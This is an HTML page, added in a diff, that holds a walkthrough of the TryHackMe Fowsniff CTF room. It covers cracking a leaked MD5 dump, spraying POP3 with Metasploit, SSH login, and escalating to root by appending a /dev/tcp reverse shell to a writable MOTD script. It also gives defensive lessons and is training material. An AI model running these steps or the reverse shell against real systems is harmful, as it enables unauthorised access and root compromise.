@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://challenges.cloudflare.com; style-src 'self' https://cdnjs.cloudflare.com; font-src 'self' https://cdnjs.cloudflare.com; img-src 'self' data:; connect-src 'self' https://formspree.io https://hacker-news.firebaseio.com; frame-src https://challenges.cloudflare.com; form-action 'self' https://formspree.io; base-uri 'self'; object-src 'none'; upgrade-insecure-requests">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>Fowsniff CTF Write-up (TryHackMe) | White Rabbit Security</title>
+    <meta name="description" content="A walkthrough of the TryHackMe Fowsniff CTF room: a leaked credential dump, cracking hashes and spraying POP3, an SSH password hidden in a mailbox, and a writable MOTD script to root.">
+    <meta name="theme-color" content="#060b13">
+    <link rel="canonical" href="https://whiterabbitsecurity.app/learn/writeups/fowsniff/">
+    <link rel="icon" href="/img/favicon-32.png" type="image/png" sizes="32x32">
+    <link rel="icon" href="/img/favicon-192.png" type="image/png" sizes="192x192">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <meta property="og:site_name" content="White Rabbit Security">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:title" content="Fowsniff CTF Write-up (TryHackMe) | White Rabbit Security">
+    <meta property="og:description" content="A walkthrough of the TryHackMe Fowsniff CTF room: a leaked credential dump, cracking hashes and spraying POP3, an SSH password hidden in a mailbox, and a writable MOTD script to root.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://whiterabbitsecurity.app/learn/writeups/fowsniff/">
+    <meta property="og:image" content="https://whiterabbitsecurity.app/wrs.jpg">
+    <meta property="og:image:alt" content="White Rabbit Security crest">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Fowsniff CTF Write-up (TryHackMe) | White Rabbit Security">
+    <meta name="twitter:description" content="A walkthrough of the TryHackMe Fowsniff CTF room: a leaked credential dump, POP3 spraying, an SSH password in a mailbox, and a writable MOTD script to root.">
+    <meta name="twitter:image" content="https://whiterabbitsecurity.app/wrs.jpg">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <a class="skip-link" href="#main">Skip to content</a>
+    <nav>
+        <a href="/" class="nav-logo">
+            <img src="/img/logo-mark.png" alt="White Rabbit Security" width="40" height="40">
+        </a>
+        <div class="nav-links">
+            <a href="/">Home</a>
+            <a href="/services/">Services</a>
+            <a href="/about/">About</a>
+            <a href="/news/">News</a>
+            <a href="/contact/">Contact</a>
+            <a href="/learn/" class="active" aria-current="page">Learn</a>
+        </div>
+    </nav>
+
+    <main id="main" tabindex="-1">
+        <header class="hero">
+            <h1>Fowsniff <span class="highlight">CTF</span></h1>
+            <p>TryHackMe &middot; Linux &middot; Easy. A company that got breached left the fallout lying around: a leaked credential dump, a temporary password in a mailbox, and a login script anyone could edit.</p>
+            <p class="lede">Target and flag values are from a shared practice environment and are redacted here. The point is the method, not the answers.</p>
+        </header>
+
+        <section class="services" aria-labelledby="f-recon">
+            <h2 id="f-recon" class="section-title">1. <span class="highlight">Recon</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>Scan, then fingerprint. Four services stand out &mdash; and the two mail services are the point of the room.</p>
+                <pre class="code-block"><code>nmap -p- -sC -sV -oA scans/all TARGET</code></pre>
+                <ul class="spec-list">
+                    <li><i class="fa-solid fa-lock" aria-hidden="true"></i> <strong>22</strong> SSH, <strong>80</strong> HTTP (Apache).</li>
+                    <li><i class="fa-solid fa-envelope" aria-hidden="true"></i> <strong>110</strong> POP3 and <strong>143</strong> IMAP (Dovecot) &mdash; a mail server you can log in to once you have credentials.</li>
+                </ul>
+                <p>The website tells the story: Fowsniff Corp was breached, and the attackers leaked employee credentials. The site (and the company's social media, referenced in the pages) points to a public dump of <strong>username:hash</strong> pairs.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="f-crack">
+            <h2 id="f-crack" class="section-title">2. Crack the <span class="highlight">Dump</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>The dump is a list of usernames with MD5 password hashes. Identify the hash type and crack them offline against rockyou.</p>
+                <pre class="code-block"><code>hashid 'HASH'                       # MD5
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+# several crack -> a set of username:password pairs</code></pre>
+                <p>Most of the hashes fall quickly, giving a handful of valid employee passwords and the matching usernames.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="f-pop3">
+            <h2 id="f-pop3" class="section-title">3. Spray POP3 and Read the <span class="highlight">Mail</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>Those are webmail credentials, so spray them against POP3 to see which still work. Metasploit's POP3 login scanner does it cleanly.</p>
+                <pre class="code-block"><code>msfconsole -q
+use auxiliary/scanner/pop3/pop3_login
+set RHOSTS TARGET
+set USER_FILE users.txt
+set PASS_FILE cracked.txt
+run                                   # one (or more) accounts authenticate</code></pre>
+                <p>Log in to the mailbox by hand and read what's there &mdash; POP3 is a simple text protocol.</p>
+                <pre class="code-block"><code>nc TARGET 110
+USER baksteen
+PASS ********
+LIST
+RETR 1</code></pre>
+                <p>The mailbox holds an internal message: after the breach, IT reset <strong>SSH access for every employee to one temporary shared password</strong>, to be changed on first login. That password is in the email.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="f-ssh">
+            <h2 id="f-ssh" class="section-title">4. SSH In</h2>
+            <div class="service-card prose-card sheet">
+                <p>The shared reset password works over SSH for the mailbox owner, giving an interactive shell and the user flag.</p>
+                <pre class="code-block"><code>ssh baksteen@TARGET     # shared reset password — user.txt</code></pre>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="f-root">
+            <h2 id="f-root" class="section-title">5. Writable MOTD to <span class="highlight">Root</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>Check group membership and hunt for files your group can write. The account belongs to a group that owns the message-of-the-day script <code>/opt/cube/cube.sh</code> &mdash; and the MOTD scripts in <code>/etc/update-motd.d/</code> run that file <strong>as root every time someone logs in over SSH</strong>.</p>
+                <pre class="code-block"><code>id
+find / -group baksteen -writable 2>/dev/null   # /opt/cube/cube.sh</code></pre>
+                <p>Append a payload to the script, then open a second SSH session to trigger the MOTD as root.</p>
+                <pre class="code-block"><code>echo 'bash -c "bash -i >&/dev/tcp/YOUR_IP/1337 0>&1"' >> /opt/cube/cube.sh
+# new terminal: nc -lvnp 1337, then ssh baksteen@TARGET again -> root shell</code></pre>
+                <p>The login runs the script as root and the listener catches a root shell; the root flag follows.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="f-lessons">
+            <h2 id="f-lessons" class="section-title">What To <span class="highlight">Take Away</span></h2>
+            <div class="service-card prose-card">
+                <ul class="spec-list">
+                    <li><i class="fa-solid fa-user-secret" aria-hidden="true"></i> Breached credentials get reused everywhere. After a leak, force resets and assume every old password is burned.</li>
+                    <li><i class="fa-solid fa-key" aria-hidden="true"></i> Never hand every user the same temporary password &mdash; and never email it.</li>
+                    <li><i class="fa-solid fa-file-code" aria-hidden="true"></i> A login-time script writable by a normal user runs as root on every login. Lock down MOTD scripts and group-writable files.</li>
+                    <li><i class="fa-solid fa-envelope-open-text" aria-hidden="true"></i> Low-value protocols like POP3 are worth logging into &mdash; mailboxes hold secrets.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="services">
+            <div class="uplink">
+                <div class="uplink-icon"><i class="fa-solid fa-flag" aria-hidden="true"></i></div>
+                <h2>Try It <span class="highlight">Yourself</span></h2>
+                <p>Fowsniff CTF is a free room on TryHackMe. Work it yourself first, then compare notes.</p>
+                <div class="hero-buttons">
+                    <a href="https://tryhackme.com/room/fowsniffctf" target="_blank" rel="noopener noreferrer" class="btn btn-primary">Open on TryHackMe</a>
+                    <a href="/learn/writeups/" class="btn btn-outline">All write-ups</a>
+                </div>
+            </div>
+        </section>
+        <section class="services">
+            <div class="service-actions"><a href="/learn/writeups/" class="btn btn-outline btn-sm">Back to Write-ups</a></div>
+        </section>
+    </main>
+    <footer class="site-footer">
+        <p>&copy; 2026 White Rabbit Security</p>
+        <p>Client information shared with us is treated as confidential. Do not send passwords or sensitive data through this site.</p>
+        <p class="footer-links"><a href="/contact/">Contact</a> <a href="/privacy/">Privacy</a> <a href="/.well-known/security.txt">security.txt</a></p>
+    </footer>
+</body>
+</html>
